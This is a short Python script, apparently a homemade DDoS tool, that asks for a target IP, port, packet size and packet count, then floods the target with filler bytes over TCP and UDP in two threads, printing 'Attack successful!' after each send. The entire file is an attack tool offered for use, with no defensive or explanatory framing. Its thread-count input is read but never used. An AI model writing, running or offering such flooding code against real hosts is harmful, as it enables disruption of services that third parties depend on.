import socket
import threading

def tcp_ddos(target_ip, target_port, packet_size, num_packets):
    data = b'X' * packet_size  # Packet data

    for _ in range(num_packets):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target_ip, target_port))
            s.sendall(data)
            print("\033[92m[+] Attack successful! Target IP:", target_ip, "Port:", target_port)
        except Exception as e:
            print("\033[91m[!] Error occurred:", e)
        finally:
            s.close()

def udp_ddos(target_ip, target_port, packet_size, num_packets):
    data = b'X' * packet_size  # Packet data

    for _ in range(num_packets):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.sendto(data, (target_ip, target_port))
            print("\033[92m[-] Attack successful! Target IP:", target_ip, "Port:", target_port)
        except Exception as e:
            print("\033[91m[!] Error occurred:", e)
        finally:
            s.close()

def main():
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port: "))
    packet_size = int(input("Enter packet size: "))
    num_packets = int(input("Enter number of packets: "))
    num_threads = int(input("Enter number of threads: "))

    # Create threads for TCP and UDP attacks
    tcp_thread = threading.Thread(target=tcp_ddos, args=(target_ip, target_port, packet_size, num_packets))
    udp_thread = threading.Thread(target=udp_ddos, args=(target_ip, target_port, packet_size, num_packets))

    # Start the attack
    tcp_thread.start()
    udp_thread.start()

if __name__ == "__main__":
    main()